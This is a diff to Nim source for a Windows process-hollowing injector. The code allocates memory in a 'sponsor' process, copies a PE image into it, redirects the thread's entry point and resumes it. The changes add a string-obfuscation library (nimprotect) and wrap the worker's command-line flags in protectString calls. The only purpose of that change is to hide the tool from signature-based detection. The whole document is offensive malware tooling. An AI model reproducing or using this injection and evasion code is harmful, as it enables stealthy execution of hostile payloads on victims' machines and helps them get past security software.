@@ -2,6 +2,7 @@ import os
 import winim
 import strutils
 import ptr_math
+import nimprotect
 
 when defined(hollow5):
     include syscalls2
@@ -84,7 +85,7 @@ proc writeMemoryProcess(
         processHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         unsafeAddr peImageImageBase,
-        8,
+        cast[size_t](sizeof(PVOID)),
         NULL
     ) != 0:
         quit(1)
@@ -157,7 +158,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
 
     # Allocate memory in sponsor process
     when not defined(release): echo "[*] Allocating memory in sponsor process"     
-    ppi = createProcessWorker("-A:" & $sponsorProcessHandle)
+    ppi = createProcessWorker(protectString("-A:") & $sponsorProcessHandle)
     WaitForSingleObject(ppi.hProcess, 3 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
@@ -168,7 +169,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
 
     # Copy PE to sponsor process 
     when not defined(release): echo "[*] Copying PE to sponsor process"
-    ppi = createProcessWorker("-W:" & $sponsorProcessHandle)
+    ppi = createProcessWorker(protectString("-W:") & $sponsorProcessHandle)
     WaitForSingleObject(ppi.hProcess, 3 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
@@ -177,7 +178,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
 
     # Change sponsor thread Entrypoint
     when not defined(release): echo "[*] Changing thread context"
-    ppi = createProcessWorker("-T:" & $sponsorThreadHandle)
+    ppi = createProcessWorker(protectString("-T:") & $sponsorThreadHandle)
     WaitForSingleObject(ppi.hProcess, 3 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
@@ -186,7 +187,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
 
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
-    ppi = createProcessWorker("-R:" & $sponsorThreadHandle)
+    ppi = createProcessWorker(protectString("-R:") & $sponsorThreadHandle)
     WaitForSingleObject(ppi.hProcess, 3 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
@@ -220,7 +221,7 @@ proc hollow56Worker*(peStr: string): bool =
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
     var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
-    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
+    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
     var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
     var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
     var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
@@ -232,30 +233,30 @@ proc hollow56Worker*(peStr: string): bool =
 
     # Parse command line args
     for i in commandLineParams:
-        if i.startsWith("-A:"):
+        if i.startsWith(protectString("-A:")):
             allocateMemoryProcess(
-                parseInt(i.replace("-A:", "")), 
+                parseInt(i.replace(protectString("-A:"), "")), 
                 addr peImageImageBase, 
                 addr peImageSize
             )
-        elif i.startsWith("-W:"):
+        elif i.startsWith(protectString("-W:")):
             writeMemoryProcess(
-                parseInt(i.replace("-W:", "")), 
+                parseInt(i.replace(protectString("-W:"), "")), 
                 peImageNtHeaders, 
                 peImageImageBase, 
                 peBytesPtr, 
                 peImageSizeOfHeaders, 
                 peImageSectionsHeader 
             )
-        elif i.startsWith("-T:"):
+        elif i.startsWith(protectString("-T:")):
             setThreadProcess(
-                parseInt(i.replace("-T:", "")),
+                parseInt(i.replace(protectString("-T:"), "")),
                 peImageImageBase,
                 peImageEntryPoint
             )
-        elif i.startsWith("-R:"):
+        elif i.startsWith(protectString("-R:")):
             resumeThreadProcess(
-                parseInt(i.replace("-R:", ""))
+                parseInt(i.replace(protectString("-R:"), ""))
             )
         else:
             quit(1)
